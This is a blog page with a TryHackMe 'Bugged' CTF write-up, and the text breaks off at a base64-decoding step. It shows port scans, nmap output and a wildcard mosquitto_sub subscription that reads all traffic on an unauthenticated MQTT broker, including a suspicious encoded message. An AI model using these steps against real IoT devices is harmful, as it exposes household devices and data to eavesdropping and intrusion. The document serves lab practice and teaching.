<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bugged Tryhackme CTF Writeup - Offensive Blogs</title><meta name="description" content="John¬†was working on his smart home appliances when he&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.github.io/feed.json"><meta property="og:title" content="Bugged Tryhackme CTF Writeup - Offensive Blogs "><meta property="og:image" content="https://sakibulalikhan.github.io/media/posts/5/Bugged.jpg"><meta property="og:image:width" content="256"><meta property="og:image:height" content="256"><meta property="og:site_name" content="Offensive Blogs"><meta property="og:description" content="John¬†was working on his smart home appliances when he&hellip;"><meta property="og:url" content="https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="Bugged Tryhackme CTF Writeup - Offensive Blogs "><meta name="twitter:description" content="John¬†was working on his smart home appliances when he&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.github.io/media/posts/5/Bugged.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/avatar.png" type="image/png"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/avatar.png" type="image/png"><link rel="stylesheet" href="https://sakibulalikhan.github.io/assets/css/style.css?v=af2a3de25879b28da182667ee98b43c8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html"},"headline":"Bugged Tryhackme CTF Writeup","datePublished":"2023-08-19T02:15","dateModified":"2023-08-19T03:10","image":{"@type":"ImageObject","url":"https://sakibulalikhan.github.io/media/posts/5/Bugged.jpg","height":256,"width":256},"description":"John¬†was working on his smart home appliances when he&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.github.io/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body><header class="header" id="js-header"><a href="https://sakibulalikhan.github.io/" class="logo">Offensive Blogs</a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.github.io/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.github.io/aboutme.html" target="_self">About Me</a></li><li><a href="https://sakibulalikhan.github.io/tags/ctf-writeup/" target="_self">CTF Writeups</a></li></ul></nav></header><main><div class="wrapper"><article class="post"><header class="post__header"><a href="https://sakibulalikhan.github.io/tags/tryhackme/" class="post__maintag">Tryhackme</a><h1 class="post__title">Bugged Tryhackme CTF Writeup</h1><div class="post__meta"><div class="post__author">By <a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" rel="author" title="Sakibul Ali Khan">Sakibul Ali Khan</a></div><time datetime="2023-08-19T02:15">August 19, 2023</time></div></header><figure class="post__featured-image"><img src="https://sakibulalikhan.github.io/media/posts/5/Bugged.jpg" srcset="https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="eager" height="256" width="256" alt="Bugged Tryhackme CTF Writeup"></figure><div class="post__inner"><div class="post__entry"><p id="ee57" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">John</strong>¬†was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p><h1 id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Difficulty = Easy</h1><p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges: Network Analyze, IoT Hacking.</strong></p><p id="f868" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning start with Rustscan. For scan, we use ‚Äò-a‚Äô flag to specify our target. And we also use ‚Äò-r‚Äô flag to set port ranges.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="dc46" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali~ rustscan -a <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> -r <span class="hljs-number">1</span>-<span class="hljs-number">5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| {}  }| { } |{ {_<span class="hljs-number">_</span> {<span class="hljs-number">_</span>   <span class="hljs-number">_</span>}{ {_<span class="hljs-number">_</span>  /  __<span class="hljs-number">_</span>} / {} \ |  <span class="hljs-string">`| |<br>| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br>`</span>-<span class="hljs-string">' `-'</span><span class="hljs-string">`-----'`</span>----<span class="hljs-string">'  `-'</span>  <span class="hljs-string">`----'  `</span>---<span class="hljs-string">' `-'</span>  <span class="hljs-string">`-'`</span>-<span class="hljs-string">' `-'</span><br>The Modern Day Port Scanner.<br>_______________________________________<span class="hljs-number">_</span><br>: https:<span class="hljs-regexp">//gi</span>thub.com/RustScan/RustScan :<br> --------------------------------------<br>üåçHACK THE PLANETüåç<br><br>[~] The config file is expected to be at <span class="hljs-string">"/home/sak/.rustscan.toml"</span><br>[~] File limit higher than batch size. Can increase speed by increasing batch size <span class="hljs-string">'-b 1073741716'</span>.<br>Open <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span>:<span class="hljs-number">1883</span><br>[~] Starting Script(s)<br>[&gt;] Script to be run Some(<span class="hljs-string">"nmap -vvv -p {{port}} {{ip}}"</span>)<br><br>[~] Starting Nmap <span class="hljs-number">7.93</span> ( https:<span class="hljs-regexp">//nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span> +<span class="hljs-number">06</span><br>Initiating Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">2</span> ports]<br>Completed Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">24</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">1</span> port]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">1883</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Completed Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">25</span>s elapsed (<span class="hljs-number">1</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Host is up, received conn-refused (<span class="hljs-number">0</span>.<span class="hljs-number">25</span>s latency).<br>Scanned at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span>:<span class="hljs-number">49</span> +<span class="hljs-number">06</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>s<br><br>PORT     STATE SERVICE REASON<br><span class="hljs-number">1883</span>/tcp <span class="hljs-keyword">open</span>  mqtt    syn-ack</span></pre><p id="d3fd" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there is 1 a service running. In target machine service ‚ÄòMQTT‚Äô is running on TCP port ‚Äò1883‚Äô.</p><h1 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Basic Information About ‚ÄòMQTT‚Äô</h1><p id="dc0e" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe,¬†<strong class="ly kz">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging ‚Äúmachine-to-machine‚Äù (M2M) or ‚ÄúInternet of Things‚Äù world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p><p id="253d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Default port:</strong>¬†1883</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="kl km aoc"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*_zH7lb_3H1yrrcAU.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*_zH7lb_3H1yrrcAU.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*_zH7lb_3H1yrrcAU.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*_zH7lb_3H1yrrcAU.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*_zH7lb_3H1yrrcAU.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*_zH7lb_3H1yrrcAU.png 1100w, https://miro.medium.com/v2/resize:fit:1326/format:webp/0*_zH7lb_3H1yrrcAU.png 1326w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 663px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*_zH7lb_3H1yrrcAU.png 640w, https://miro.medium.com/v2/resize:fit:720/0*_zH7lb_3H1yrrcAU.png 720w, https://miro.medium.com/v2/resize:fit:750/0*_zH7lb_3H1yrrcAU.png 750w, https://miro.medium.com/v2/resize:fit:786/0*_zH7lb_3H1yrrcAU.png 786w, https://miro.medium.com/v2/resize:fit:828/0*_zH7lb_3H1yrrcAU.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*_zH7lb_3H1yrrcAU.png 1100w, https://miro.medium.com/v2/resize:fit:1326/0*_zH7lb_3H1yrrcAU.png 1326w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 663px"><img src="https://miro.medium.com/v2/resize:fit:663/0*_zH7lb_3H1yrrcAU.png" alt="Bugged Tryhackme CTF Writeup" width="663" height="534" loading="lazy" data-is-external-image="true"></figure></div><figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">Basic Information About ‚ÄòMQTT‚Äô</figcaption></figure><p id="51f5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now our second step began here. At this moment we start the Nmap scan to know more about the service that is running on the server.</p><p id="3d37" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For Nmap scan, we use ‚Äò-sV‚Äô flag to know about services &amp; versions. And we use ‚Äò-sC‚Äô flag to default script scan. We also use ‚Äò-p‚Äô flag to specify which port we want to scan.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ecef" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali~ sudo nmap -sV -sC -p 1883 10.10.232.80<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 13:08 +06<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.232.80<br>Host is up (0.25s latency).<br><br>PORT     STATE SERVICE                  VERSION<br>1883/tcp open  mosquitto version 2.0.14<br>| mqtt-subscribe: <br>|   Topics and their most recent payloads: <br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/1min: 4410.65<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/5min: 4.71<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/15min: 85.18<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/connected: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/5min: 0.39<br>|     livingroom/speaker: {<span class="hljs-string">"id"</span>:15127941740320722645,<span class="hljs-string">"gain"</span>:46}<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/sent: 3575<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/15min: 0.22<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/count: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/stored: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/messages/sent: 52<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/active: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/subscriptions/count: 3<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/bytes: 369<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/received: 119484<br>|     storage/thermostat: {<span class="hljs-string">"id"</span>:14536458125521088285,<span class="hljs-string">"temperature"</span>:23.189959}<br>|     patio/lights: {<span class="hljs-string">"id"</span>:8415478818146317759,<span class="hljs-string">"color"</span>:<span class="hljs-string">"WHITE"</span>,<span class="hljs-string">"status"</span>:<span class="hljs-string">"OFF"</span>}<br>|     kitchen/toaster: {<span class="hljs-string">"id"</span>:9223877754878364611,<span class="hljs-string">"in_use"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"temperature"</span>:156.5998,<span class="hljs-string">"toast_time"</span>:210}<br>|     <span class="hljs-variable">$SYS</span>/broker/version: mosquitto version 2.0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/bytes/received: 167321<br>|     frontdeck/camera: {<span class="hljs-string">"id"</span>:5624806846270235642,<span class="hljs-string">"yaxis"</span>:143.5409,<span class="hljs-string">"xaxis"</span>:-37.70204,<span class="hljs-string">"zoom"</span>:4.5788803,<span class="hljs-string">"movement"</span>:<span class="hljs-literal">false</span>}<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/maximum: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/received: 3524<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/15min: 3970.90<br>|     <span class="hljs-variable">$SYS</span>/broker/retained messages/count: 36<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/5min: 4291.50<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/sent: 291<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/1min: 21.93<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/15min: 0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/uptime: 2343 seconds<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/5min: 0.42<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/5min: 95.12<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/1min: 113.75<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/5min: 90.41<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/1min: 91.82<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/15min: 1.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/15min: 83.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/5min: 552.51<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/15min: 398.79<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/1min: 1255.39<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/total: 2<br>|_    <span class="hljs-variable">$SYS</span>/broker/bytes/sent: 16314<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.10 seconds</span></pre><p id="8551" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For ferther scan we use ‚Äòmosquitto‚Äô tool. If your device does have not this tool you can install it by this simple command.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="d4fc" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo apt-<span class="hljs-keyword">get</span> install mosquitto mosquitto-clients -y</span></pre><p id="a423" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we use ‚Äúmosquitto_sub‚Äù and use ‚Äò-t‚Äô flag to specifying the topic and also use ‚Äò-h‚Äô flag to specify the host address. If we give any topic in in ‚Äò-t‚Äô flag then we‚Äôll get information about that topic. But here we want information about all topics. So, on ‚Äò-t‚Äô flag we use the wildcard ‚Äú#‚Äù for this operation.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="7f11" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-variable">@kali</span>~ mosquitto_sub -t <span class="hljs-string">"#"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6303134845423256684</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7062282878224178102</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5297822194260674402</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.360235</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2860013371319219134</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.233936</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5845551519049790310</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14786151255640681934</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11637714936854629483</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">158.6413</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">207</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12972826565605654962</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.58</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5464270745344776246</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">88.01166</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">120.650795</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">3.0464551</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3711207335622492878</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7536635942787451007</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14890795244202004796</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.076757</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2458810731003226774</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">144.60513</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">251</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">9928724913760140067</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6498368860634934991</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.349384</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3598942894745952976</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12888160293013420529</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">124.13611</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">175.50891</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">0.9612895</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:true</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7852150045648343267</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">153.8073</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">121</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">17285335294252743187</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11505589973457021977</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.719482</span>}<br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">16076301308523402932</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7411803660708968315</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">18348470723758418035</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.625862</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12464564460746554731</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">150.03351</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">297</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">652803559971738546</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6540437519393488331</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.25789</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5951090730247747994</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">76.82907</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">96.71407</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">1.7843343</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12233324324560130586</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span>}</span></pre><p id="80a3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this operation we got something interesting thing:</p><p id="4662" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">‚ÄúeyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==‚Äù</p><blockquote class="abq abr abs"><p id="66fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">They asked us, ‚ÄúCan you help him figure out what these weird network communications are?‚Äù Yes, got something weird on network communications.</p></blockquote><p id="fedf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This is base64 encoded. So, let‚Äôs decode this and see what we got.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="74ce" 